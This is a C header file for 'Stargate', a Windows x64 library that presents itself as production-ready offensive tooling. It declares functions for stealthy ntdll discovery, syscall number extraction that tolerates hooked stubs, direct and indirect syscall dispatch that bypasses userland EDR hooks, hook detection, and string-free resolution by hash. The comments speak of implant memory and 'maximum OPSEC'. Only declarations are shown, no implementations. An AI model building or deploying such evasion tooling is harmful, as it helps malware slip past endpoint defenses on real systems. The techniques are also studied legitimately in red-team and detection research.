/*
 * BM-T1005: Stargate Complete — Unified Stealth Library
 *
 * PRODUCTION-READY LIBRARY — One header, one init, maximum OPSEC.
 *
 * Integrates:
 *   - BM-T1002 (Moonwalk): Stack-based module discovery — NO PEB walk
 *   - BM-T1003 (Direct Syscalls): SSN extraction + direct invocation
 *   - BM-T1004 (Indirect Syscalls): Gadget trampoline through ntdll
 *   - Tartarus' Gate: SSN fallback when stubs are hooked (scans neighbors)
 *
 * Usage:
 *   #include "stargate.h"
 *
 *   sg_init(NULL);   // NULL = best defaults (Moonwalk + indirect)
 *
 *   SgSyscall alloc;
 *   sg_resolve("NtAllocateVirtualMemory", &alloc);
 *
 *   PVOID addr = NULL;
 *   SIZE_T size = 0x1000;
 *   sg_call_6(&alloc, (void*)(HANDLE)-1, &addr, (void*)0, &size,
 *             (void*)(MEM_COMMIT | MEM_RESERVE), (void*)PAGE_READWRITE);
 *
 * The library resolves ANY NT syscall on demand — not limited to a
 * fixed set. Resolve what you need, call it with the matching sg_call_N.
 *
 * Thread Safety:
 *   sg_call_N sets g_syscall_gadget (a global) before each indirect call.
 *   Safe for single-threaded use (typical for offensive tooling).
 *   For multi-threaded scenarios, wrap sg_call_N() in a mutex or
 *   use thread-local storage for the gadget pointer.
 *
 * Platform: Windows x64 only
 * Build:    make libstargate.a   (static library)
 *           make demo.exe        (educational demo)
 */

#ifndef STARGATE_H
#define STARGATE_H

#include <windows.h>
#include <winternl.h>

#ifdef __cplusplus
extern "C" {
#endif

/* ========================================================================
 * Configuration
 * ======================================================================== */

typedef enum {
    SG_INDIRECT = 0,  /* Default — execute syscall from ntdll memory */
    SG_DIRECT   = 1   /* Execute syscall from implant memory */
} SgSyscallMode;

typedef struct {
    SgSyscallMode mode;    /* SG_INDIRECT (0) or SG_DIRECT (1) */
} SgConfig;

/* ========================================================================
 * Resolved Syscall Handle
 *
 * Holds everything needed to invoke one NT syscall: the SSN and an
 * optional per-function gadget for indirect mode.
 *
 * Populated by sg_resolve() or sg_resolve_hash(). Passed to sg_call_N().
 * ======================================================================== */

typedef struct {
    DWORD ssn;       /* Syscall service number */
    void *gadget;    /* Per-function gadget for indirect mode (NULL = shared) */
} SgSyscall;

/* ========================================================================
 * Initialization
 * ======================================================================== */

/*
 * sg_init — Initialize the Stargate library.
 *
 * @param config: Configuration, or NULL for best defaults.
 *                NULL = { .mode = SG_INDIRECT }
 * @return: 0 on success, -1 on failure.
 *
 * Steps:
 *   1. Locates ntdll via Moonwalk stack scan — NO PEB walk
 *   2. If SG_INDIRECT: finds shared syscall;ret gadget in ntdll
 *
 * Does NOT pre-resolve any NT functions — that happens on demand
 * via sg_resolve() / sg_resolve_hash().
 */
int sg_init(SgConfig *config);

void sg_cleanup(void);
int sg_is_initialized(void);

/* ========================================================================
 * Syscall Resolution — Resolve ANY NT Function On Demand
 *
 * Each call resolves one NT function:
 *   1. Finds the function in ntdll's EAT (by name or hash)
 *   2. Extracts the SSN (with Tartarus' Gate fallback if hooked)
 *   3. Finds a per-function gadget within the stub's own memory range
 *
 * The result is stored in an SgSyscall struct that you pass to sg_call_N.
 *
 * NOTE: Uses plaintext NT function names for educational clarity.
 * For production use, prefer sg_resolve_hash() — see README.md.
 * ======================================================================== */

/*
 * sg_resolve — Resolve an NT syscall by name.
 *
 * @param func_name: NT function name (e.g. "NtAllocateVirtualMemory")
 * @param out:       Populated on success with SSN + gadget
 * @return: 0 on success, -1 on failure.
 */
int sg_resolve(const char *func_name, SgSyscall *out);

/*
 * sg_resolve_hash — Resolve an NT syscall by FNV-1a hash.
 *
 * Uses BM-T1001's hash-based EAT resolution — no strings in the binary.
 * Compute the hash with hash_name() from loader.h (see BM-T1001 hash-generator.c).
 *
 * @param func_hash: FNV-1a hash of the NT function name (hash_name)
 * @param out:       Populated on success with SSN + gadget
 * @return: 0 on success, -1 on failure.
 */
int sg_resolve_hash(DWORD func_hash, SgSyscall *out);

/* ========================================================================
 * Syscall Dispatch — sg_call_N
 *
 * Invoke a resolved syscall with N arguments.
 * Cast all arguments to (void *).
 *
 * In indirect mode, sets the per-function gadget before each call.
 * In direct mode, executes syscall from implant memory.
 *
 * Returns NTSTATUS. Returns STATUS_INVALID_PARAMETER (0xC000000D)
 * if the SgSyscall is NULL or has SSN == 0 (unresolved).
 *
 * Supports 0-11 arguments (covers all known NT syscalls, including
 * NtCreateThreadEx at 11 and NtMapViewOfSection at 10).
 * ======================================================================== */

NTSTATUS sg_call_0(SgSyscall *sc);
NTSTATUS sg_call_1(SgSyscall *sc, void *a1);
NTSTATUS sg_call_2(SgSyscall *sc, void *a1, void *a2);
NTSTATUS sg_call_3(SgSyscall *sc, void *a1, void *a2, void *a3);
NTSTATUS sg_call_4(SgSyscall *sc, void *a1, void *a2, void *a3, void *a4);
NTSTATUS sg_call_5(SgSyscall *sc, void *a1, void *a2, void *a3, void *a4, void *a5);
NTSTATUS sg_call_6(SgSyscall *sc, void *a1, void *a2, void *a3, void *a4, void *a5, void *a6);
NTSTATUS sg_call_7(SgSyscall *sc, void *a1, void *a2, void *a3, void *a4, void *a5, void *a6, void *a7);
NTSTATUS sg_call_8(SgSyscall *sc, void *a1, void *a2, void *a3, void *a4, void *a5, void *a6, void *a7, void *a8);
NTSTATUS sg_call_9(SgSyscall *sc, void *a1, void *a2, void *a3, void *a4, void *a5, void *a6, void *a7, void *a8, void *a9);
NTSTATUS sg_call_10(SgSyscall *sc, void *a1, void *a2, void *a3, void *a4, void *a5, void *a6, void *a7, void *a8, void *a9, void *a10);
NTSTATUS sg_call_11(SgSyscall *sc, void *a1, void *a2, void *a3, void *a4, void *a5, void *a6, void *a7, void *a8, void *a9, void *a10, void *a11);

/* ========================================================================
 * Module Discovery (Moonwalk)
 * ======================================================================== */

HMODULE sg_find_module(const wchar_t *dll_name);
LPVOID sg_resolve_export(HMODULE module_base, const char *func_name);
LPVOID sg_resolve_by_hash(HMODULE module_base, DWORD func_hash);

/* ========================================================================
 * Hook Detection (BM-T1002 / Moonwalk)
 *
 * NOTE: Stargate does NOT include unhooking. Syscalls (both direct and
 * indirect) bypass userland hooks entirely — the hooked bytes in ntdll
 * are never executed. If you need to unhook Win32 API calls that have
 * no NT syscall equivalent, use BM-T2003 (nt_unhooker) separately.
 * ======================================================================== */

typedef enum {
    SG_HOOK_NONE = 0,
    SG_HOOK_JMP_REL32,
    SG_HOOK_JMP_ABS,
    SG_HOOK_CALL_REL32,
    SG_HOOK_PUSH_RET,
    SG_HOOK_MOV_JMP,
    SG_HOOK_INLINE_PATCH
} SgHookType;

typedef struct {
    int is_hooked;
    SgHookType hook_type;
    size_t hook_offset;
    void *jump_target;
    unsigned char original_bytes[24];
    unsigned char hooked_bytes[24];
    size_t bytes_len;
    float match_ratio;
} SgHookInfo;

LPVOID sg_scan_with_hook_detection(
    HMODULE module_base,
    const unsigned char *signature,
    size_t sig_len,
    SgHookInfo *hook_info
);

int sg_extract_clean_signature(
    const wchar_t *dll_name,
    const char *func_name,
    unsigned char *signature_out,
    size_t sig_size
);

/* ========================================================================
 * SSN Extraction (BM-T1003) — For advanced users
 * ======================================================================== */

DWORD sg_extract_ssn(void *func_addr);

/* ========================================================================
 * Internal State (read-only)
 * ======================================================================== */

HMODULE sg_get_ntdll_base(void);
SgSyscallMode sg_get_syscall_mode(void);

#ifdef __cplusplus
}
#endif

#endif /* STARGATE_H */
